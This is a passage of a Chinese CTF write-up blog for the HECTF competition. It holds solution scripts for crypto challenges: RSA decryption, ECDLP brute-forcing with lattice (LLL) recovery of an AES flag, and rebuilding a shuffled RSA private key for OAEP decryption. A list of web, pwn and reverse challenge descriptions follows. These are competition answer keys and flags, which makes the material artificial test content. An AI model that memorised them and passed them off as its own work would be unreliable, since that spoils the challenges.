class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> inverse, long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span></span><br><span class=\"line\">q = <span class=\"number\">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class=\"line\">c = <span class=\"number\">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\">n=p*q</span><br><span class=\"line\">phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">d = inverse(e, phi)</span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">m = long_to_bytes(m)</span><br><span class=\"line\">m = base64.b64decode(m)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m)</span><br><span class=\"line\"><span class=\"comment\">#b&#x27;HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"不合格的魔药\"><a class=\"markdownIt-Anchor\" href=\"#不合格的魔药\">#</a> 不合格的魔药：</h3>\n<p>根据题目描述的提示可以看到题目中好几处参数不合理的地方，比如 p,q 的大小等，因为异或操作并不会把多余的部分去掉，所以密文中泄露了很多消息，但还有一个问题就是如何求 key，这时一个 ECDLP 问题，可以采用 MOV 攻击，不过既然参数不合理，也可以尝试爆破</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> bytes_to_long,long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class=\"line\">q = <span class=\"number\">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class=\"line\">a = <span class=\"number\">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class=\"line\">b = <span class=\"number\">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class=\"line\">x = <span class=\"number\">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class=\"line\">x1 = <span class=\"number\">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class=\"line\">y1 = <span class=\"number\">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class=\"line\">c = [<span class=\"number\">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class=\"number\">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class=\"number\">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class=\"number\">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 先求key，可以用MOV攻击，也可以直接爆破，这里直接爆破了</span></span><br><span class=\"line\">Ep = EllipticCurve(GF(p), [a, <span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">G = Ep.lift_x(x)</span><br><span class=\"line\">hint1 = Ep(x1, y1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> hint1 ==  key * G:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(key)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"comment\"># key = 51517</span></span><br><span class=\"line\"><span class=\"comment\"># 然后求flag,可以用铜匠定理也可以构造格子</span></span><br><span class=\"line\">n = p*q</span><br><span class=\"line\">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class=\"line\">Cur=EllipticCurve(Zmod(n),[a,b])</span><br><span class=\"line\">aes = AES.new(k, AES.MODE_ECB)</span><br><span class=\"line\"></span><br><span class=\"line\">m=[]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recover</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    M=Matrix(ZZ,[[<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">2</span>^<span class=\"number\">128</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>*x*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>^<span class=\"number\">256</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,(<span class=\"number\">3</span>*x^<span class=\"number\">2</span>+a)*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>^<span class=\"number\">128</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,-<span class=\"number\">1</span>*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>^<span class=\"number\">256</span>,<span class=\"number\">0</span>,-<span class=\"number\">2</span>*y*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>^<span class=\"number\">512</span>,(x^<span class=\"number\">3</span>+a*x-y^<span class=\"number\">2</span>+b)*<span class=\"number\">2</span>^<span class=\"number\">512</span>],</span><br><span class=\"line\">                [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,n*<span class=\"number\">2</span>^<span class=\"number\">512</span>]])</span><br><span class=\"line\">    v=M.LLL()[-<span class=\"number\">1</span>]</span><br><span class=\"line\">    dx=<span class=\"built_in\">int</span>(v[<span class=\"number\">2</span>])//<span class=\"number\">2</span>^<span class=\"number\">256</span></span><br><span class=\"line\">    dy=<span class=\"built_in\">int</span>(v[<span class=\"number\">4</span>])//<span class=\"number\">2</span>^<span class=\"number\">256</span></span><br><span class=\"line\">    gx=x+dx</span><br><span class=\"line\">    gy=y+dy</span><br><span class=\"line\">    m.append(x^^gx)</span><br><span class=\"line\">    m.append(y^^gy)</span><br><span class=\"line\">recover(c[<span class=\"number\">0</span>],c[<span class=\"number\">1</span>])</span><br><span class=\"line\">recover(c[<span class=\"number\">2</span>],c[<span class=\"number\">3</span>])</span><br><span class=\"line\">out=<span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">    out+=aes.decrypt(long_to_bytes(i))</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">b&#x27;HECTF&#123;&#x27;</span>+ out+ <span class=\"string\">b&#x27;&#125;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<h3 id=\"情书与破碎的证书\"><a class=\"markdownIt-Anchor\" href=\"#情书与破碎的证书\">#</a> 情书与破碎的证书</h3>\n<p>首先我们需要知道证书的基本格式 在证书中必然含有 -----BEGIN PRIVATE KEY-----<br>\n 这一段可以拆成<br>\n 2d 2d 2d 2d 2d 42 45 47 49</p>\n<p>4e 20 50 52 49 56 41 54 45</p>\n<p>20 4b 45 59 2d 2d 2d 2d 2d<br>\n 和已经整理好的相比<br>\n 49 47 45 42 2d 2d 2d 2d 2d</p>\n<p>45 54 41 56 49 52 50 20 4e</p>\n<p>2d 2d 2d 2d 2d 59 45 4b 20<br>\n 很容易看出 1 和 9 换 2 和 8 换 3 和 7 换 4 和 6 换</p>\n<p>我们将证书整理一下 可以得</p>\n<p>30 82 04 bc 02 01 00 30 0d<br>\n06 09 2a 86 48 86 f7 0d 01<br>\n01 01 05 00 04 82 04 a6 30<br>\n82 04 a2 02 01 00 02 82 01<br>\n01 00 bd db 99 13 77 8d 23<br>\n15 44 9b 58 7f bd 7f 6e 41<br>\n94 4d 1c 9c 54 84 c9 b0 1f<br>\nbf 53 44 93 35 5c f8 84 89<br>\ncb f9 63 0f 42 99 bb 4d bb<br>\n84 df 7b d6 60 7b 7a 57 8f<br>\n84 e4 c6 d6 a7 0f 50 6c 16<br>\na4 31 1b 15 08 e3 97 5d b7<br>\n1e 71 d6 d2 d1 7d d7 5b 9c<br>\n23 e2 d4 37 bc f7 f5 d9 50<br>\n6e 76 3c 71 22 a5 76 fd 5c<br>\n15 90 5a b4 5f eb a2 0a 24<br>\n12 86 28 5b 8b a5 d6 db d1<br>\nb7 d0 ce 97 5a b7 4e ae 33<br>\n8f e0 dd 5a 19 4d 02 91 8e<br>\n4f 0a d6 d1 60 f1 b7 30 74<br>\n3f c2 c8 eb 74 db 01 08 9d<br>\n21 0d 50 c5 aa 1f 25 97 93<br>\nb5 12 b2 6a 8f 3e 62 cc 6a<br>\n95 e9 ce f6 5e 5d 49 e9 e6<br>\n6d 35 2d db b1 40 8f a9 fe<br>\n5b 29 a1 64 2c 61 d2 c4 d3<br>\n2c 66 c5 6d d6 fa 36 39 b2<br>\n14 6b 1f 59 29 89 6a ba b4<br>\nb1 ed 35 ec f5 7d d6 30 ce<br>\nca c1 5f cc 6b 74 3f 97 f0<br>\n86 f2 c6 04 0e 66 e9 1e 92<br>\n05 31 ba 61 2b e1 92 7b 67<br>\n54 52 5e 08 e5 19 02 03 01<br>\n00 01 02 82 01 00 04 62 04</p>\n<p>中间被打碎了<br>\n d4 8d 90 d8 0f 02 81 80 51<br>\na5 f7 e7 f4 c0 50 a5 0e 18<br>\nfd e1 2f ce e2 64 6f 2b 43<br>\n16 0b 0c 75 ab 49 25 e8 26<br>\n9a e8 0e 70 cf 12 73 4f 41<br>\nfa b1 8d 04 24 ed 7c ce b7<br>\ndd b2 7c be 0f 55 4f 7a 6e<br>\n16 98 d4 ec 5b a2 b4 8d 61<br>\n2e 23 37 ae b7 5f 8a 57 d8<br>\n15 5a 11 d0 7b 2c 49 d3 d9<br>\n7c 4f f0 cf b8 9e 6d d4 f3<br>\n6c c3 7c 01 0b 5b c8 93 56<br>\na3 9b 57 6c c3 ed d0 3c dc<br>\n4d 79 1d f5 09 1a 55 71 df<br>\n1a 6c 15 ee da a0 77 3c f3<br>\ncf 02 81 80 0f c6 1f 05 d1<br>\n9c 96 ee c3 ed ca cc a3 4e<br>\n1d 3e 2c ab 43 9b eb ab 66<br>\n93 a3 ce 2c a9 9f 88 ab 9c<br>\ndd 18 3c eb 8e 80 1d 82 98<br>\nf8 35 35 98 64 ef 19 1d b3<br>\nf5 32 69 97 6b a0 4b 03 60<br>\n6e 54 08 59 de cd 05 80 5c<br>\n4a a7 9d c6 db 22 38 06 58<br>\nea f0 bf fb a0 f4 e7 19 bc<br>\nf1 b1 e0 41 69 d8 e0 cb 3a<br>\nf4 d9 0b 2e 62 d7 c7 ed 30<br>\n45 d4 9b 52 5c a7 15 ca 3b<br>\n84 f0 7b 4e ce 27 d0 4d 17<br>\n95 29 9f a1 86 cd 02 81 80<br>\n25 c2 0a b2 52 9f 1e fd 3d<br>\n35 34 7c 57 3b 28 2a bf d9<br>\n5b 26 4c 92 f6 c4 f9 ec 8b<br>\n7c 71 32 06 fb ea 18 86 88<br>\n0e 29 a3 6c 47 ef 9b b7 53<br>\nce 95 67 ea 4d 3e 08 3c 30<br>\nf3 44 02 2f 95 b7 cd 71 14<br>\n81 3b f6 a2 8e cc 67 d5 fe<br>\n05 95 32 42 68 4c d2 9c 1c<br>\n5d d8 a7 44 16 89 0e 5c 94<br>\n3c 70 90 4b a7 0e 34 9b 15<br>\n71 9a 46 6f 90 1f bf 0c fc<br>\n78 40 f8 03 2e 31 af bc cf<br>\nb8 4f 4a 81 7e a5 1c 8f 90<br>\nfd 6a 2d 2d 2d 2d 2d 45 4e<br>\n44 20 50 52 49 56 41 54 45<br>\n20 4b 45 59 2d 2d 2d 2d 2d</p>\n<p>根据 rsa 证书格式 我们可以得到<br>\n标识头 30</p>\n<p>总长度 82 04bc</p>\n<p>版本信息 0201 00300d06092a864886f70d0101010500048204a6308204a2020100</p>\n<p>n 02820101 00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</p>\n<p>e 0203 010001</p>\n<p>d 02820100</p>\n<p>046204（没用）</p>\n<p>q d48d90d80f（没用）</p>\n<p>dp 028180</p>\n<p>51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</p>\n<p>dq 028180</p>\n<p>0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</p>\n<p>inv(q,p) 028180</p>\n<p>25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/3be30da7583d4ebd84509ed31b1e9164.jpeg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>可以通过 openssl 进行一些了解 或者修补私钥 但不是本题的考点<br>\n（上图为 openssl 中修好的秘钥 可以看到十六进制部分是相同的）</p>\n<p>得到这些后 我们就可以来一个简单的 dp 泄露<br>\n但是要注意，我之前提到了明文中有中文，所以我们需要使用 PKCS1_OAEP 解密器<br>\n传统的解密脚本无效</p>\n<p>以下是脚本</p>\n<p>from Crypto.PublicKey import RSA<br>\nfrom Crypto.Cipher import PKCS1_OAEP<br>\nfrom Crypto.Util.number import inverse, long_to_bytes<br>\nimport binascii</p>\n<p>hex_p = “0x00efaf90cae18eedc592a6cc57e6f4fb8812cd663274c90c0c82240b4a13c6d1772bab4f32f087cf3179f93513da0775529422f3c1ed5a0b8c2bd81bcd65a2451eab291585d1f39cc7dfc4c36ef2ff0e9be22d9252c80c7e11cd493542c27731965a5603dde878356433d07b99431eb69dc9856931583e9ced764503bded010857”<br>\nhex_q = “0x00cac7cc600b5e888df3f9e905d48d088d1a15819dbde1c8501028ffe3b02bf237acb277b43eda8a2110e9b6931cbfffe6eeade466611be17454f2d0c848a567e77065e82ff4f2aa0de7bfe1e622d060f67a5f6fc87e5859ed6aec857cf8124418b4c73a40628fdddd002504444acb31fb0b4ea35068ec8c1ffb933ed48d90d80f”<br>\nhex_e = “0x10001”<br>\nhex_c = “0x92c8bf09c04cf0193306f9203b19956fbcbe796c6e65fdaefeb49c5fb0391c1f78552d5fb4385ba3dfd11efb23759fdc386a2336e827b0be5b3514522b8063149d584edef58f2d64b4e8d6c9e5813de1d27b4c3fe970abfb4495700ed04b496bf1eb8d90b5a836ba3d852e0038d943ce116d691ec1490750c62b1cd19a1816ade9325c9ac739255b1c24e95cc387050ff521c3f60882efe33c66409498654ed39bc6c1253c21e3e78dc67937666a2ae64826cfe4767f24a5712069ec3a31e0f36ce4ef473041f8df8e553e72771d81b6ef75a95d29172483fcc33ea9c396f98af037527d4f6bd0cbf033e1f8263aba1f1cb35fca87e119c4b953526be191ada6”</p>\n<p>p = int(hex_p, 16)<br>\nq = int(hex_q, 16)<br>\ne = int(hex_e, 16)<br>\nc = int(hex_c, 16)</p>\n<p>n = p * q</p>\n<p>phi_n = (p - 1) * (q - 1)</p>\n<p>d = inverse(e, phi_n)</p>\n<p>rsa_key = RSA.construct((n, e, d, p, q))</p>\n<p># 使用 PKCS1_OAEP 初始化解密器<br>\n cipher = PKCS1_OAEP.new (rsa_key)</p>\n<p># 将密文转为字节形式<br>\n ciphertext_bytes = long_to_bytes©</p>\n<p>decrypted_message_bytes = cipher.decrypt(ciphertext_bytes)<br>\n# 将解密后的字节数据转换为字符串，使用 UTF-8 解码<br>\n message = decrypted_message_bytes.decode (‘utf-8’)<br>\nprint(“Decrypted Message:”, message)</p>\n<p t1an_dog_no_g3t_g00d_d1e=\"\">Decrypted Message: 你知道么，rsa 的大数分解的坚固就像爱情一样坚不可摧，你愿意让我们也像 rsa 一样坚不可摧么？但是你并不关心结局，你只关心你的 flag:HECTF</p>\n<h1 id=\"题目描述记录\"><a class=\"markdownIt-Anchor\" href=\"#题目描述记录\">#</a> 题目描述记录：</h1>\n<h2 id=\"web-2\"><a class=\"markdownIt-Anchor\" href=\"#web-2\">#</a> Web：</h2>\n<h3 id=\"are-u-happy\"><a class=\"markdownIt-Anchor\" href=\"#are-u-happy\">#</a> <strong>Are u happy</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>开始开心地玩耍吧！</p>\n</blockquote>\n<h3 id=\"baby_sql-2\"><a class=\"markdownIt-Anchor\" href=\"#baby_sql-2\">#</a> <strong>baby_sql</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>g01den 的公司里有个记录员工打卡的后台，只有 admin 才能登陆，但是，g01den 发现，每次去公司视察的时候公司里的员工总数始终和打卡了的员工数目对不上，g01den 怀疑公司里的某位员工利用了漏洞，于是他在后台程序里增加了一些 WAF，并且他对他自己的 WAF 很自信，并暗示了那位员工他在数据库里放了一个重要的信息（flag），能拿到这个信息（flag）的人年终可以获得额外的奖金。作为那位员工的你应该如何拿到这个信息获得奖金呢？ flag 由 HECTF 开头，得到的答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p>\n</blockquote>\n<h3 id=\"baby_unserialize-2\"><a class=\"markdownIt-Anchor\" href=\"#baby_unserialize-2\">#</a> <strong>baby_unserialize</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>一个简单的反序列化，一个简单的 RCE</p>\n</blockquote>\n<h3 id=\"你一个人专属的进货网站-2\"><a class=\"markdownIt-Anchor\" href=\"#你一个人专属的进货网站-2\">#</a> <strong>你一个人专属的进货网站</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p>\n</blockquote>\n<h3 id=\"ezweb-2\"><a class=\"markdownIt-Anchor\" href=\"#ezweb-2\">#</a> <strong>ezweb</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>Try to be admin to get flag！！！</p>\n<p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p>\n</blockquote>\n<h3 id=\"ezjava-2\"><a class=\"markdownIt-Anchor\" href=\"#ezjava-2\">#</a> ezjava</h3>\n<p>题目描述：</p>\n<blockquote>\n<p>A 了这道题，我就承认你是真正的奶龙</p>\n</blockquote>\n<h2 id=\"re-2\"><a class=\"markdownIt-Anchor\" href=\"#re-2\">#</a> Re</h2>\n<h3 id=\"babyre-2\"><a class=\"markdownIt-Anchor\" href=\"#babyre-2\">#</a> <strong>babyre</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p>\n</blockquote>\n<h3 id=\"littleasm\"><a class=\"markdownIt-Anchor\" href=\"#littleasm\">#</a> <strong>littleasm</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>百行代码里的藏匿的 flag</p>\n</blockquote>\n<h3 id=\"pepy\"><a class=\"markdownIt-Anchor\" href=\"#pepy\">#</a> <strong>PE?py?</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>在 pyre 里找到压缩包密码</p>\n</blockquote>\n<h3 id=\"easyree\"><a class=\"markdownIt-Anchor\" href=\"#easyree\">#</a> <strong>easyree</strong></h3>\n<p>题目描述：</p>\n<blockquote xxxx=\"\">\n<p>flag 格式 HECTF</p>\n</blockquote>\n<h3 id=\"ezandroid\"><a class=\"markdownIt-Anchor\" href=\"#ezandroid\">#</a> <strong>ezAndroid</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h2 id=\"pwn-2\"><a class=\"markdownIt-Anchor\" href=\"#pwn-2\">#</a> Pwn</h2>\n<h3 id=\"sign-in-2\"><a class=\"markdownIt-Anchor\" href=\"#sign-in-2\">#</a> <strong>sign in</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>快来签到吧…</p>\n</blockquote>\n<h3 id=\"find-eggy-2\"><a class=\"markdownIt-Anchor\" href=\"#find-eggy-2\">#</a> <strong>find eggy</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"arcaea_sorting-2\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting-2\">#</a> <strong>Arcaea_Sorting</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p>\n<p>听好了：</p>\n<p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p>\n<p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p>\n<p>至此，一锤定音。</p>\n<p>尘埃，已然落定。</p>\n<p>#HECTF #听好了 #韵律源点</p>\n</blockquote>\n<h3 id=\"arcaea_sorting_revenge-2\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting_revenge-2\">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p>\n</blockquote>\n<h3 id=\"喵喵喵\"><a class=\"markdownIt-Anchor\" href=\"#喵喵喵\">#</a> <strong>喵喵喵</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"lip\"><a class=\"markdownIt-Anchor\" href=\"#lip\">#</a> <strong>lip</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h2 id=\"crypto-2\"><a class=\"markdownIt-Anchor\" href=\"#crypto-2\">#</a> Crypto</h2>\n<h3 id=\"迷茫的艾米莉-2\"><a class=\"markdownIt-Anchor\" href=\"#迷茫的艾米莉-2\">#</a> <strong>迷茫的艾米莉</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p>\n</blockquote>\n<h3 id=\"翻一翻-2\"><a class=\"markdownIt-Anchor\" href=\"#翻一翻-2\">#</a> <strong>翻一翻</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p>\n</blockquote>\n<h3 id=\"seven-more-2\"><a class=\"markdownIt-Anchor\" href=\"#seven-more-2\">#</a> <strong>seven more</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>more than more no co-prime</p>\n</blockquote>\n<h3 id=\"情书与破碎的证书-2\"><a class=\"markdownIt-Anchor\" href=\"#情书与破碎的证书-2\">#</a> <strong>情书与破碎的证书</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p>\n<p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p>\n</blockquote>\n<h3 id=\"不合格的魔药-2\"><a class=\"markdownIt-Anchor\" href=\"#不合格的魔药-2\">#</a> 